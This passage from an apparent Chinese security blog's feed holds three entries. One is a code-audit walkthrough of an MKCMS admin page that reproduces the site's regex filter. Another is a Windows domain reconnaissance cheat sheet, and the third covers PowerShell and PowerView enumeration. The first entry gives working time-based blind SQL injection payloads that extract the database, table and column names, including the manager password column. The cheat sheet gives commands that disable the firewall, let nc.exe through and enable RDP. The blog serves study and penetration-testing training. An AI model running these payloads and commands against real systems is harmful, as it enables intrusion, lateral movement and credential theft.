class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_COOKIE <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">	StopAttack($key,$value,$cookiefilter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正则</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$getfilter=<span class="string">"'|(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$postfilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$cookiefilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br></pre></td></tr></table></figure>

<p>看见这段代码我是懵逼的，仔细看了下发现貌似是过滤整条SQL语句。。不确定就问了下大佬，的确是，不止是过滤sql语句也过滤xss，嗯，对大佬说这是很简单的一个正则表达式(我真垃圾，正则后面还是得好好学一波。。)</p>
<p>可以看见这段正则匹配完整的SQL语句大致把常规的增删改查都给过滤了，盲注中的延时注入或布尔注入都阔以绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">延时注入</span><br><span class="line">	payload:</span><br><span class="line">		and if(length(database())&#x3D;6,sleep(10),1) &#x2F;&#x2F;如果数据库名&#x3D;6 页面延时10秒，失败</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeale0dojj31eg0u04bn.jpg" alt="image-20200602220203248"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">	and if(length(database())&#x3D;5,sleep(10),1) &#x2F;&#x2F;如果数据库名&#x3D;5 页面延时10秒,成功</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeakjmssjj31j50u0anf.jpg" alt="image-20200602220111981"></p>
<p>验证是存在注入，并且可以用延时注入绕过正则匹配。此处需配合ascii码表来进行测试，如果对应字母的ascii码正确不会延时，错误会延时</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库名称</span><br><span class="line">	payload:http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),1,1))&#x3D;101,0,sleep(10))&#x2F;&#x2F;错误延时10秒</span><br></pre></td></tr></table></figure>

<p>101==e，而数据库第一个字符为m==109</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeax8nlv6j31fx0u0qgd.jpg" alt="image-20200602221326238"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">	http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),1,1))&#x3D;109,0,sleep(10))&#x2F;&#x2F;正确立即返回</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeayize5oj31iw0u0tju.jpg" alt="image-20200602221440660"></p>
<p>以此类推</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库第二个字符</span><br><span class="line">	payload：http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),2,1))&#x3D;107,0,sleep(10))</span><br><span class="line"></span><br><span class="line">数据库第三个字符</span><br><span class="line">	payload：http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),3,1))&#x3D;99,0,sleep(10))</span><br><span class="line"></span><br><span class="line">数据库第四个字符</span><br><span class="line">	payload：http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),4,1))&#x3D;109,0,sleep(10))</span><br><span class="line"></span><br><span class="line">数据库第五个字符</span><br><span class="line">	payload：http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),5,1))&#x3D;115,0,sleep(10))</span><br><span class="line">	</span><br><span class="line">数据库名称为：mkcms</span><br></pre></td></tr></table></figure>

<p>判断数据库中一共有多少张表，由于cms过滤了引号，所以将数据库名转成hex</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and if((select count(table_name) from information_schema.tables where table_schema&#x3D;0x6D6B636D73)&#x3D;17,sleep(5),0)&#x2F;&#x2F;如果数据库中有17个表，延时5秒</span><br></pre></td></tr></table></figure>



<p>查询数据库的第一个表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload: </span><br><span class="line">&#x2F;&#x2F;判断数据库第一张表名长度为8</span><br><span class="line">and if((select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1)&#x3D;8,0,sleep(5))</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;第一张表的对应字符为对应ascii码，立即返回，反之延时5秒</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),1,1)))&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;k</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),2,1)))&#x3D;107,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;c</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),3,1)))&#x3D;99,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),4,1)))&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;s</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),5,1)))&#x3D;115,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;_</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),6,1)))&#x3D;95,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;a</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),7,1)))&#x3D;97,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;d</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),8,1)))&#x3D;100,0,sleep(5))</span><br><span class="line"></span><br><span class="line">得出数据库第一张表名为：mkcms_ad</span><br></pre></td></tr></table></figure>

<p>逐步查询多个表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询第n个表的表名长度,修改n即可</span><br><span class="line">and if((select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit n,1)&#x3D;个数,0,sleep(5))</span><br><span class="line">查询第n个表的表名，修改n即可</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),1,n)))&#x3D;ascii码,0,sleep(5))</span><br></pre></td></tr></table></figure>



<p>查询列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;查询mkcms_manager共有9列</span><br><span class="line">	and if((select count(column_name) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572)&#x3D;9,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;判断第一个列名的长度</span><br><span class="line">and if((select length(column_name) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0,1)&#x3D;4,0,sleep(5))</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;判断某个列名长度，修改即可</span><br><span class="line">and if((select length(column_name) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit n,1)&#x3D;长度,0,sleep(5))</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;猜解第一个列名</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr(column_name,1(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0(列),1)&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;_</span><br><span class="line">and if((select ascii(substr(column_name,2(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0(列),1)&#x3D;95,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;i</span><br><span class="line">and if((select ascii(substr(column_name,3(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0(列),1)&#x3D;105,0,sleep(5)i</span><br><span class="line">&#x2F;&#x2F;d</span><br><span class="line">and if((select ascii(substr(column_name,4(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0(列),1)&#x3D;100,0,sleep(5))</span><br><span class="line"></span><br><span class="line">第一个列名为：m_id</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;猜解第二个列名</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr(column_name,1(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;_</span><br><span class="line">and if((select ascii(substr(column_name,2(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;95,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;n</span><br><span class="line">and if((select ascii(substr(column_name,3(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;110,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;a</span><br><span class="line">and if((select ascii(substr(column_name,4(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;97,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr(column_name,5(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;e</span><br><span class="line">and if((select ascii(substr(column_name,6(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;101,0,sleep(5))</span><br><span class="line"></span><br><span class="line">第二个列名为m_name，以此类推</span><br><span class="line">第三个列名为m_password</span><br><span class="line">第四个列名为m_levels</span><br><span class="line">第五个列名为m_random</span><br><span class="line">第六个列名为m_status</span><br><span class="line">第七个列名为m_logintime</span><br><span class="line">第八个列名为m_loginip</span><br><span class="line">第九个列名为m_loginnum</span><br><span class="line"></span><br><span class="line">判断字段中值的长度</span><br><span class="line">and if((SELEct length(id) FRom mkcms_userka limit 0,1)&#x3D;1,0,sleep(5))</span><br><span class="line"></span><br><span class="line">查询字段中的值</span><br><span class="line">and if((select ascii(substr(id,1,1)) from mkcms_userka limit 0,1)&#x3D;49,0,sleep(5))</span><br><span class="line"></span><br><span class="line">其他以此类推</span><br></pre></td></tr></table></figure>

<p>由于手工太麻烦，建议使用sqlmap一把梭</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>域内信息收集</title>
    <url>/2020/06/03/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfefawqi6aj31c00u01kx.jpg" alt="37"></p>
<a id="more"></a>

<h3 id="0x01-本机信息收集"><a href="#0x01-本机信息收集" class="headerlink" title="0x01 本机信息收集"></a>0x01 本机信息收集</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前工作组</span><br><span class="line">	net view</span><br><span class="line"></span><br><span class="line">查询网络配置</span><br><span class="line">	ifconfig &#x2F;all</span><br><span class="line"></span><br><span class="line">本机用户列表</span><br><span class="line">	net user</span><br><span class="line"></span><br><span class="line">管理员用户列表</span><br><span class="line">	net localgroup administrators</span><br><span class="line">	</span><br><span class="line">查看当前在线用户</span><br><span class="line">	query user || qwinsta</span><br><span class="line">	</span><br><span class="line">查询进程</span><br><span class="line">	tasklist &#x2F;v</span><br><span class="line">	wmic process list brief</span><br><span class="line">	</span><br><span class="line">查询端口列表</span><br><span class="line">	netstat -ano</span><br><span class="line">	</span><br><span class="line">查询系统补丁信息等</span><br><span class="line">	systeminfo</span><br><span class="line">	</span><br><span class="line">查询补丁列表</span><br><span class="line">	wmic qfe get caption,description,HotFixID,installed0n</span><br><span class="line"></span><br><span class="line">查询本机共享</span><br><span class="line">	net share</span><br><span class="line">	net share hostname(主机名)</span><br><span class="line">	wmic share get name,path,status</span><br><span class="line">	</span><br><span class="line">IPC$连接</span><br><span class="line">	net use \\ip\ipc$ &quot;密码&quot; &#x2F;user:账号</span><br><span class="line">	net use Z: \\ip\c$ 映射网络主机C盘到本机</span><br><span class="line">	</span><br><span class="line">查询用户权限</span><br><span class="line">	whoami</span><br></pre></td></tr></table></figure>

<h5 id="收集操作系统及安装软件版本信息"><a href="#收集操作系统及安装软件版本信息" class="headerlink" title="收集操作系统及安装软件版本信息"></a>收集操作系统及安装软件版本信息</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取操作系统和版本信息</span><br><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS 名称(name)&quot; &#x2F;C:&quot;OS )&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnam3q16yj30hm01wdfr.jpg" alt="image-20200207022821299"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看安装软件以及版本、路径等</span><br><span class="line">	wmic product get name,version</span><br><span class="line">	powershell &quot;get-wmiobject -class win32_product | select-object -property name,version&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnam9wfsdj30ms052dg1.jpg" alt="image-20200207023024307"></p>
<h5 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">关闭防火墙(需管理员权限)</span><br><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbname8imnj31m60nejwn.jpg" alt="image-20200207023641913"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">关闭防火墙(需管理员权限)</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamhlzjnj31p60ouwjy.jpg" alt="image-20200207023753883"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询防火墙配置文件</span><br><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnaml9thij30m611g40c.jpg" alt="image-20200207024132560"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">自定义防火墙日志存储位置</span><br><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</span><br><span class="line"></span><br><span class="line">允许指定程序全部连接(适用于03之前系统版本)</span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br><span class="line"></span><br><span class="line">允许指定程序全部连接</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;c:\nc.exe&quot;</span><br><span class="line"></span><br><span class="line">允许指定程序连出</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;allow nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;c:\nc.exe&quot;</span><br><span class="line"></span><br><span class="line">允许3389端口放行</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;remote desktop &quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure>

<h5 id="远程连接服务"><a href="#远程连接服务" class="headerlink" title="远程连接服务"></a>远程连接服务</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看远程连接端口</span><br><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v portnumber</span><br><span class="line"></span><br><span class="line">远程开启3389端口</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"></span><br><span class="line">远程关闭3389端口</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 11111111 &#x2F;f</span><br></pre></td></tr></table></figure>

<h3 id="0x02-域内信息收集"><a href="#0x02-域内信息收集" class="headerlink" title="0x02 域内信息收集"></a>0x02 域内信息收集</h3><h5 id="判断是否有域"><a href="#判断是否有域" class="headerlink" title="判断是否有域"></a>判断是否有域</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">反向解析查询</span><br><span class="line">nslookup 域名(例：hacker.testlab)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询当前域</span><br><span class="line">net config workstation</span><br></pre></td></tr></table></figure>


<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamypwg8j30k809qaba.jpg" alt="1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前时间服务器</span><br><span class="line">net time &#x2F;domain   &#x2F;&#x2F;一般域控服务器同为时间服务器</span><br></pre></td></tr></table></figure>


<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamvfm71j30ek02ymxd.jpg" alt="1"></p>
<h5 id="域内基本信息"><a href="#域内基本信息" class="headerlink" title="域内基本信息"></a>域内基本信息</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询域</span><br><span class="line">	net view &#x2F;domain</span><br><span class="line"></span><br><span class="line">查询域内所有计算机</span><br><span class="line">	net view &#x2F;domain:域名(例 domain：hacker)</span><br><span class="line">	</span><br><span class="line">查询域内所有用户组</span><br><span class="line">	net group &#x2F;domain</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询所有域成员计算机列表</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamuytrpj30kw0a6jsl.jpg" alt="image-20200207020339816"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取域密码信息</span><br><span class="line">net accounts &#x2F;domain</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnan20vpkj30ey07wwfm.jpg" alt="image-20200207020603858"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取域信任信息</span><br><span class="line">nltest &#x2F;domain_trusts</span><br><span class="line"></span><br><span class="line">查找域控制器机器名</span><br><span class="line">nltest &#x2F;DCLIST:hacker</span><br><span class="line"></span><br><span class="line">查看域控制器主机名</span><br><span class="line">nslookup -type&#x3D;SRV _ldap._tcp</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamw32gxj30g807owfc.jpg" alt="image-20200207021227520"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看域控制器组</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamwgqhoj30ne074js5.jpg" alt="image-20200207021357499"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询所有域用户列表</span><br><span class="line">net user &#x2F;domain</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamuk18yj30ms0723z9.jpg" alt="image-20200207021511718"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取域内用户的详细信息</span><br><span class="line">wmic useraccount get &#x2F;all</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnan0dl03j324g07i79i.jpg" alt="image-20200207021618025"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前用户连接状态</span><br><span class="line">query user</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamwv3s9j30n4036gm3.jpg" alt="image-20200207021758498"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询本地管理员组的用户</span><br><span class="line">Net localgroup administrators</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamu197zj30mu072t9h.jpg" alt="image-20200207021908677"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询域管理员用户</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamxc0s4j30pw0dw75v.jpg" alt="image-20200207021957307"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询企业管理员用户组</span><br><span class="line">net group &quot;Enterprise Admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamxt6zvj30ni06mdgm.jpg" alt="image-20200207022118443"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询域用户sid</span><br><span class="line">whoami &#x2F;all</span><br><span class="line"></span><br><span class="line">查询指定用户域信息</span><br><span class="line">net user administrator &#x2F;domain</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnan15izmj30n00m4tbk.jpg" alt="image-20200207022616595"></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>域内信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>powershell收集域信息</title>
    <url>/2020/06/03/powershell%E6%94%B6%E9%9B%86%E5%9F%9F%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfefnjnylhj318t0u0hdt.jpg" alt="39"></p>
<a id="more"></a>

<h3 id="0x00-PowerShell"><a href="#0x00-PowerShell" class="headerlink" title="0x00 PowerShell"></a>0x00 PowerShell</h3><p>PowerShell版本信息：</p>
<ul>
<li><p>2.0    windows2008，windows7</p>
</li>
<li><p>3.0    windows2012，windows8</p>
</li>
<li><p>4.0    windows2012R2，windows8.1</p>
</li>
<li><p>5.0    windows2016，windows10</p>
</li>
</ul>
<p>PowerShell权限</p>
<ul>
<li><p>Restricted</p>
<ul>
<li>默认的设置， 不允许任何script运行</li>
</ul>
</li>
</ul>
<ul>
<li><p>Allsigned         </p>
<ul>
<li>只能运行经过数字证书签名的script</li>
</ul>
</li>
</ul>
<ul>
<li><p>Unrestricted    </p>
<ul>
<li>运行本地的script不需要数字签名，但是运行从网络上下载的script就必须要有数字签名</li>
</ul>
</li>
</ul>
<ul>
<li><p>RemoteSigned</p>
<ul>
<li>允许所有的script运行</li>
</ul>
</li>
</ul>
<p>PowerShell基本命令</p>
<ul>
<li><p>Get-ExecutionPolicy</p>
<ul>
<li><p>查看当前策略</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6b4ae3j30rq05gt9j.jpg" alt="image-20200217162808642"></p>
</li>
</ul>
</li>
<li><p>Set-ExecutionPolicy 参数(例：Unrestricted)</p>
<ul>
<li><p>修改执行策略权限</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6e3msmj30q605sq4g.jpg" alt="image-20200217163122772"></p>
</li>
</ul>
</li>
<li><p>-exec bypass</p>
<ul>
<li><p>绕过禁止执行脚本策略</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj66h2zlj30my0c2tbs.jpg" alt="image-20200217163648923"></p>
</li>
</ul>
</li>
<li><p>Import-Module .\PowerView.ps1</p>
<ul>
<li>导入脚本</li>
</ul>
</li>
</ul>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj68rhtpj30n001m74q.jpg" alt="image-20200217163257583"></p>
<h3 id="0x01-PowerShell收集信息"><a href="#0x01-PowerShell收集信息" class="headerlink" title="0x01 PowerShell收集信息"></a>0x01 PowerShell收集信息</h3><h4 id="PowerView常用命令"><a href="#PowerView常用命令" class="headerlink" title="PowerView常用命令"></a>PowerView常用命令</h4><p>Get-NetDomain:获取当前用户所在的域名称</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj64ds1xj30h807i75d.jpg" alt="image-20200217163900114"></p>
<p>Get-NetUser:返回所有用户的详细信息</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6bziwdj30u01ah7j7.jpg" alt="image-20200217163942936"></p>
<p>Get-NetDomainController:获取所有域控制器</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6cnzq7j30ya0b4acp.jpg" alt="image-20200217164034756"></p>
<p>Get-NetComputer:获取所有域内机器的详细信息</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj651tghj30i4038jrx.jpg" alt="image-20200217164133046"></p>
<p>Get-NetOU:获取域中的 OU 信息</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6czrqtj30g401aaaf.jpg" alt="image-20200217164222548"></p>
<p>Get-NetGroup:获取所有域内组和组成员信息</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj66y365j30iy0q6q7g.jpg" alt="image-20200217164242191"></p>
<p>Get-NetFileServer:根据 SPN 获取当前域使用的文件服务器</p>
<p>Get-NetShare:获取当前域内所有网络共享</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj65iq4tj30qe04wt9j.jpg" alt="image-20200217164306539"></p>
<p>Get-NetSession:获取在指定服务器存在的会话信息</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj65znhsj30xu040aau.jpg" alt="image-20200217164324626"></p>
<p>Get-NetRDPSession:获取在指定服务器存在的远程连接信息</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj68ae40j30k609ydgy.jpg" alt="image-20200217164400230"></p>
<p>Get-NetProcess:获取远程主机的进程信息</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6dhomcj30s20lotba.jpg" alt="image-20200217164434944"></p>
<p>Get-UserEvent:获取指定用户的日志信息</p>
<p>Get-ADObject:获取活动目录的对象信息</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj69blskj30xm0psqaf.jpg" alt="image-20200217164654526"></p>
<p>Get-NetGPO:获取域所有组策略对象</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj69xlvfj30y00r412k.jpg" alt="image-20200217164717550"></p>
<p>Get-DomainPolicy:获取域默认或域控制器策略</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6efcsqj30xe07mq5j.jpg" alt="image-20200217164733846"></p>
<p>Invoke-UserHunter:用于获取域用户登录计算机及该用户是否有本地管理权限</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6exa1rj30iy09yq49.jpg" alt="image-20200217164904418"></p>
<p>Invoke-ProcessHunter:查找域内所有机器进程用于找到某特定用户</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6ao0kqj30o60kqgop.jpg" alt="image-20200217164937196"></p>
<p>Invoke-UserEventHunter:根据用户日志获取某域用户登录过哪些域机器</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>域内信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库注入语句收集及学习</title>
